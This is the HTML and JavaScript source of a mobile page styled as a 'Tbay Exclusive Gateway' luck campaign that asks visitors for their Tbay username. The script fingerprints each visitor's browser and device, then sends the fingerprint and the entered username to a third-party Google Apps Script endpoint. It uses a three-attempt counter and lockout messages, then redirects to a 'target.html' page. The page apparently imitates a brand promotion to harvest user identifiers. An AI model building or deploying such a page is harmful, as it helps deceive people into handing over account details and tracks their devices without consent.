<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
  <title>Tbay Exclusive Gateway</title>
  <style>
    :root {
      --tbay-primary: #00cccc;
      --tbay-primary-deep: #009999;
      --tbay-secondary: #003152;
      --tbay-bg: #ffffff;
      --text-main: #003152;
      --text-muted: #5c7285;
      --error-red: #e11d48;
      --error-bg: #fff5f5;
      --gold-accent: #ffb900;
      --input-bg: #f4f6f6;
      --ambient-glow: rgba(0, 204, 204, 0.08);
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      background-color: var(--tbay-bg);
      background-image: 
        radial-gradient(circle at 50% 50%, rgba(255,255,255,0.1) 0%, var(--tbay-bg) 100%),
        repeating-conic-gradient(from 0deg at 50% 50%, 
            rgba(255,255,255,0) 0deg 15deg, 
            rgba(0, 204, 204, 0.02) 15deg 30deg,
            rgba(255,255,255,0) 30deg 45deg,
            rgba(0, 49, 82, 0.015) 45deg 60deg);
      color: var(--text-main);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      overflow-x: hidden;
      position: relative;
    }

    body::before {
      content: '';
      position: absolute;
      width: 350px;
      height: 350px;
      background: radial-gradient(circle, var(--ambient-glow) 0%, transparent 70%);
      top: 20%;
      left: 50%;
      transform: translateX(-50%);
      z-index: 0;
      pointer-events: none;
    }

    /* PREMIUM INITIALIZATION OVERLAY SCREEN OVERHAUL LAYOUT */
    #app-init-loader {
      position: fixed;
      inset: 0;
      width: 100%;
      height: 100%;
      background-color: var(--tbay-bg);
      background-image: 
        radial-gradient(circle at 50% 50%, rgba(255,255,255,0.1) 0%, var(--tbay-bg) 100%),
        repeating-conic-gradient(from 0deg at 50% 50%, 
            rgba(255,255,255,0) 0deg 15deg, 
            rgba(0, 204, 204, 0.02) 15deg 30deg,
            rgba(255,255,255,0) 30deg 45deg,
            rgba(0, 49, 82, 0.015) 45deg 60deg);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 20px;
      z-index: 9999;
      opacity: 1;
      transition: opacity 0.35s cubic-bezier(0.16, 1, 0.3, 1);
    }

    .init-spinner-ring {
      width: 44px;
      height: 44px;
      border: 3.5px solid rgba(0, 49, 82, 0.06);
      border-top: 3.5px solid var(--tbay-primary);
      border-radius: 50%;
      animation: spinLinear 0.8s linear infinite;
    }

    .init-charming-text {
      font-size: 0.88rem;
      font-weight: 700;
      color: var(--tbay-secondary);
      letter-spacing: 0.2px;
      animation: textPulseBreathing 2s ease-in-out infinite alternate;
    }

    @keyframes spinLinear {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    @keyframes textPulseBreathing {
      0% { opacity: 0.55; transform: scale(0.97); }
      100% { opacity: 1; transform: scale(1); }
    }

    .app-viewport {
      width: 100%;
      max-width: 440px;
      min-height: 100vh;
      position: relative;
      display: flex;
      flex-direction: column;
      padding: max(60px, calc(env(safe-area-inset-top) + 24px)) 24px 20px 24px;
      z-index: 2;
    }

    .decorations-container {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      pointer-events: none;
      z-index: 1;
    }

    .floating-asset {
      position: absolute;
      animation: luckFloat 7s ease-in-out infinite alternate;
    }

    .sparkle-asset {
      position: absolute;
      animation: sparkleBlink 2.5s linear infinite alternate;
    }

    .coin-element {
      width: 32px;
      height: 32px;
      border-radius: 50%;
      background: linear-gradient(135deg, #ffe066 0%, var(--gold-accent) 50%, #d49a00 100%);
      box-shadow: inset -2px -2px 4px rgba(0,0,0,0.2), inset 2px 2px 4px rgba(255,255,255,0.4), 0 4px 12px rgba(212,154,0,0.15);
    }

    @keyframes luckFloat {
      0% { transform: translateY(0px) rotate(0deg) scale(1); }
      100% { transform: translateY(-30px) rotate(25deg) scale(1.08); }
    }

    @keyframes sparkleBlink {
      0%, 100% { opacity: 0.2; transform: scale(0.8); }
      50% { opacity: 1; transform: scale(1.2); }
    }

    .navigation-notch-bar {
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 15px;
      z-index: 10;
    }

    .nav-arrow-back {
      width: 42px;
      height: 42px;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.9);
      border: 1px solid rgba(0, 49, 82, 0.06);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      color: var(--tbay-secondary);
      box-shadow: 0 4px 10px rgba(0,0,0,0.02);
    }

    .portal-main-card {
      opacity: 0;
      background: transparent;
      position: relative;
      z-index: 5;
      width: 100%;
      display: flex;
      flex-direction: column;
      transition: opacity 0.4s ease-in-out;
    }

    .portal-main-card.revealed {
      opacity: 1;
    }

    .attempt-pill-badge {
      position: absolute;
      top: -36px;
      left: 50%;
      transform: translateX(-50%);
      background: var(--tbay-secondary);
      color: #ffffff;
      padding: 6px 14px;
      border-radius: 20px;
      font-size: 0.72rem;
      font-weight: 700;
      letter-spacing: 0.05em;
      text-transform: uppercase;
      box-shadow: 0 4px 12px rgba(0, 49, 82, 0.12);
    }

    .attempt-pill-badge.warning-state {
      background: var(--error-red);
      box-shadow: 0 4px 12px rgba(225, 29, 72, 0.25);
    }

    .header-group {
      text-align: center;
      margin-bottom: 45px;
      margin-top: 15px;
    }

    .header-group h1 {
      font-size: 2.45rem;
      font-weight: 800;
      color: var(--text-main);
      line-height: 1.15;
      letter-spacing: -0.03em;
    }

    .header-group h1 .teal-accent {
      background: linear-gradient(135deg, var(--tbay-primary) 0%, #00acac 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      display: inline-block;
    }

    .input-form-wrapper {
      display: flex;
      flex-direction: column;
      gap: 24px;
      width: 100%;
    }

    .input-glow-container {
      position: relative;
      width: 100%;
    }

    .text-input-field {
      width: 100%;
      padding: 22px 24px;
      border-radius: 24px;
      border: 2px solid transparent;
      background-color: var(--input-bg);
      font-size: 1.2rem;
      font-weight: 700;
      text-align: center;
      color: var(--text-main);
      outline: none;
      box-shadow: inset 0 2px 4px rgba(0, 49, 82, 0.02);
      transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
    }

    .text-input-field:focus {
      background-color: #ffffff;
      border-color: var(--tbay-primary);
      box-shadow: 0 10px 30px rgba(0, 204, 204, 0.08), 0 0 0 5px rgba(0, 204, 204, 0.12);
    }

    .submit-action-btn {
      width: 100%;
      padding: 22px;
      border-radius: 24px;
      border: none;
      background: linear-gradient(135deg, var(--tbay-primary) 0%, #00e6e6 100%);
      color: var(--tbay-secondary);
      font-size: 1.15rem;
      font-weight: 800;
      letter-spacing: 0.02em;
      text-transform: uppercase;
      cursor: pointer;
      position: relative;
      overflow: hidden;
      box-shadow: 0 8px 24px rgba(0, 204, 204, 0.25);
      animation: buttonPulse 2.5s infinite;
      transition: all 0.2s ease;
    }

    @keyframes buttonPulse {
      0% { box-shadow: 0 8px 24px rgba(0, 204, 204, 0.25), 0 0 0 0px rgba(0, 204, 204, 0.3); }
      70% { box-shadow: 0 12px 28px rgba(0, 204, 204, 0.35), 0 0 0 14px rgba(0, 204, 204, 0); }
      100% { box-shadow: 0 8px 24px rgba(0, 204, 204, 0.25), 0 0 0 0px rgba(0, 204, 204, 0); }
    }

    .submit-action-btn:disabled {
      opacity: 0.5;
      cursor: not-allowed;
      animation: none;
    }

    .system-error-ribbon {
      display: none;
      background: var(--error-bg);
      border: 1px solid rgba(225, 29, 72, 0.12);
      border-radius: 16px;
      padding: 12px 16px;
      color: var(--error-red);
      font-size: 0.82rem; 
      line-height: 1.4;
      text-align: center;
      font-weight: 600;
    }

    .system-error-ribbon.active {
      display: block;
      animation: errorShake 0.4s cubic-bezier(.36,.07,.19,.97) both;
    }

    @keyframes errorShake {
      10%, 90% { transform: translate3d(-1px, 0, 0); }
      20%, 80% { transform: translate3d(2px, 0, 0); }
      30%, 50%, 70% { transform: translate3d(-3px, 0, 0); }
      40%, 60% { transform: translate3d(3px, 0, 0); }
    }

    .lockout-layout-wrapper {
      display: none;
      text-align: center;
      background: #ffffff;
      padding: 44px 24px;
      border-radius: 32px;
      box-shadow: 0 20px 50px rgba(0, 49, 82, 0.05);
      border: 1px solid rgba(0, 49, 82, 0.04);
    }

    .lockout-layout-wrapper h2 {
      font-size: 1.45rem;
      color: var(--text-main);
      margin-bottom: 14px;
      font-weight: 800;
      line-height: 1.3;
    }

    .lockout-layout-wrapper p {
      font-size: 0.85rem;
      color: var(--text-muted);
      line-height: 1.55;
      margin-bottom: 32px;
    }

    .close-system-btn {
      width: 100%;
      padding: 18px;
      border-radius: 18px;
      border: 1px solid rgba(0, 49, 82, 0.12);
      background: #ffffff;
      color: var(--tbay-secondary);
      font-size: 0.95rem;
      font-weight: 700;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <div id="app-init-loader">
    <div class="init-spinner-ring"></div>
    <span class="init-charming-text">Summoning your lucky stars... 🌟</span>
  </div>

  <div class="decorations-container">
    <div class="floating-asset coin-element" style="top: 14%; left: 5%;"></div>
    <div class="floating-asset coin-element" style="top: 68%; right: -6%; animation-delay: -3.5s; width: 24px; height: 24px;"></div>
    <svg class="sparkle-asset" style="top: 25%; right: 10%; width: 20px; height: 20px;" viewBox="0 0 24 24" fill="none"><path d="M12 2L14.8 9.2L22 12L14.8 14.8L12 22L9.2 14.8L2 12L9.2 9.2L12 2Z" fill="var(--tbay-primary)"/></svg>
    <svg class="sparkle-asset" style="top: 55%; left: 8%; width: 16px; height: 16px; animation-delay: -1.2s;" viewBox="0 0 24 24" fill="none"><path d="M12 2L14.8 9.2L22 12L14.8 14.8L12 22L9.2 14.8L2 12L9.2 9.2L12 2Z" fill="var(--gold-accent)"/></svg>
  </div>

  <div class="app-viewport">
    
    <div class="navigation-notch-bar">
      <div class="nav-arrow-back" id="backArrowBtn" aria-label="Return Navigation">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
      </div>
      <div></div>
    </div>

    <div class="portal-main-card" id="mainCardNode">
      
      <div id="stateAContainer">
        <div class="attempt-pill-badge" id="attemptBadge">3 Attempts Left</div>
        
        <div class="header-group">
          <h1>Enter Tbay<br>username to<br><span class="teal-accent">participate.</span></h1>
        </div>

        <div class="input-form-wrapper">
          <div class="input-glow-container">
            <input type="text" class="text-input-field" id="usernameInput" placeholder="username" autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false">
          </div>
          
          <button class="submit-action-btn" id="submitBtn">Try My Luck</button>

          <div class="system-error-ribbon" id="errorRibbon"></div>
        </div>
      </div>

      <div id="stateBContainer" class="lockout-layout-wrapper">
        <svg width="52" height="52" viewBox="0 0 24 24" fill="none" stroke="var(--error-red)" stroke-width="1.5" style="margin-bottom: 20px;"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m0-10.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.75c0 5.592 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.57-.598-3.75h-.152c-3.196 0-6.1-1.249-8.25-3.286zm0 13.036h.008v.008H12v-.008z" /></svg>
        <h2>Chances Completed</h2>
        <p id="lockoutDescription">You have completed all 3 available username verification attempts. Thank you for being a valued part of Tbay. Keep an eye out for future exclusive campaigns designed specifically for you.</p>
        <button class="close-system-btn" id="closeBtn">Close</button>
      </div>

    </div>
  </div>

  <script>
    const DEPLOYMENT_ENDPOINT = "https://script.google.com/macros/s/AKfycbyGM5u08oekxwYHItPoZah2t7_ZQQlnkyYkc7v1exvCIE8H_aYeWA0GhpfzEgUc0t2Vog/exec";

    function generateDeviceSignature() {
      let keys = [
        navigator.userAgent,
        navigator.language,
        screen.colorDepth,
        screen.width + 'x' + screen.height,
        new Date().getTimezoneOffset(),
        !!window.sessionStorage,
        !!window.localStorage
      ];
      let str = keys.join('||');
      let hash = 0;
      for (let i = 0; i < str.length; i++) {
        let char = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
      }
      return 'TBAY-' + Math.abs(hash).toString(16).toUpperCase();
    }

    const deviceId = generateDeviceSignature();
    
    const mainCardNode = document.getElementById('mainCardNode');
    const stateA = document.getElementById('stateAContainer');
    const stateB = document.getElementById('stateBContainer');
    const attemptBadge = document.getElementById('attemptBadge');
    const usernameInput = document.getElementById('usernameInput');
    const submitBtn = document.getElementById('submitBtn');
    const errorRibbon = document.getElementById('errorRibbon');
    const backArrowBtn = document.getElementById('backArrowBtn');
    const closeBtn = document.getElementById('closeBtn');
    const lockoutDescription = document.getElementById('lockoutDescription');

    window.addEventListener('pageshow', (event) => {
      initApp();
    });

    // PROGRAMMATIC INITIALIZATION DISMISSAL ANIMATION CONTROLLER
    function dismissInitializationOverlay() {
      const initOverlay = document.getElementById('app-init-loader');
      if (initOverlay) {
        initOverlay.style.opacity = '0';
        setTimeout(() => {
          initOverlay.style.display = 'none';
        }, 350);
      }
    }

    async function initApp() {
      if (localStorage.getItem('tbay_verified_device') === deviceId && localStorage.getItem('tbay_campaign_payload')) {
        window.location.replace('target.html');
        return;
      }

      try {
        const url = `${DEPLOYMENT_ENDPOINT}?action=getTarget&deviceId=${encodeURIComponent(deviceId)}`;
        const response = await fetch(url, { method: 'GET', mode: 'cors' });
        const data = await response.json();
        
        if (data.success) {
          localStorage.setItem('tbay_verified_device', deviceId);
          localStorage.setItem('tbay_campaign_payload', JSON.stringify(data));
          window.location.replace('target.html');
          return;
        } else if (data.lockout === true) {
          renderLockoutState(data.message);
          mainCardNode.classList.add('revealed');
          dismissInitializationOverlay();
          return;
        }
      } catch (e) {
        // Fall back seamlessly to manual inputs if network drops out
      }

      let attempts = localStorage.getItem('tbay_remaining_attempts');
      if (attempts === null) {
        localStorage.setItem('tbay_remaining_attempts', '3');
        attempts = 3;
      } else {
        attempts = parseInt(attempts);
      }
      
      if (localStorage.getItem('tbay_lockout') === 'true' || attempts <= 0) {
        renderLockoutState(localStorage.getItem('tbay_lockout_msg'));
      } else {
        stateA.style.display = 'block';
        stateB.style.display = 'none';
        updateBadgeUI(attempts);
      }

      mainCardNode.classList.add('revealed');
      dismissInitializationOverlay();
    }

    function updateBadgeUI(count) {
      attemptBadge.textContent = `${count} ${count === 1 ? 'Attempt' : 'Attempts'} Left`;
      if (count <= 1) {
        attemptBadge.classList.add('warning-state');
      } else {
        attemptBadge.classList.remove('warning-state');
      }
    }

    function renderLockoutState(customMessage) {
      localStorage.setItem('tbay_lockout', 'true');
      localStorage.setItem('tbay_remaining_attempts', '0');
      if (customMessage) {
        localStorage.setItem('tbay_lockout_msg', customMessage);
        lockoutDescription.textContent = customMessage;
      }
      stateA.style.display = 'none';
      stateB.style.display = 'block';
    }

    function showError(msg) {
      errorRibbon.textContent = msg;
      errorRibbon.classList.remove('active');
      void errorRibbon.offsetWidth; 
      errorRibbon.classList.add('active');
    }

    submitBtn.addEventListener('click', async () => {
      const userVal = usernameInput.value.trim();
      if (!userVal) {
        showError("Username cannot be empty.");
        return;
      }

      errorRibbon.classList.remove('active');
      submitBtn.disabled = true;
      submitBtn.textContent = "Verifying...";

      let currentAttempts = parseInt(localStorage.getItem('tbay_remaining_attempts') || '3');

      try {
        const url = `${DEPLOYMENT_ENDPOINT}?action=verifyUser&username=${encodeURIComponent(userVal)}&deviceId=${encodeURIComponent(deviceId)}`;
        const response = await fetch(url, { method: 'GET', mode: 'cors' });
        const data = await response.json();

        if (data.success) {
          localStorage.setItem('tbay_verified_device', deviceId);
          localStorage.setItem('tbay_campaign_payload', JSON.stringify(data));
          window.location.replace('target.html');
        } else {
          if (data.lockout === true) {
            showError(data.message);
            setTimeout(() => {
              renderLockoutState(data.message);
            }, 800);
          } else if (data.deviceLimitExceeded === true) {
            showError(data.message);
          } else {
            let nextAttempts = data.attemptsRemaining !== undefined ? data.attemptsRemaining : (currentAttempts - 1);
            localStorage.setItem('tbay_remaining_attempts', nextAttempts.toString());
            updateBadgeUI(nextAttempts);
            
            if (nextAttempts <= 0) {
              renderLockoutState();
            } else {
              showError(data.message || "Something went wrong on our end and we will fix it soon. Please try again later.");
            }
          }
        }
      } catch (err) {
        showError("Something went wrong on our end and we will fix it soon. Please try again later.");
      } finally {
        if (localStorage.getItem('tbay_lockout') !== 'true') {
          submitBtn.disabled = false;
          submitBtn.textContent = "Try My Luck";
        }
      }
    });

    backArrowBtn.addEventListener('click', () => history.back());
    closeBtn.addEventListener('click', () => history.back());
  </script>
</body>
</html>
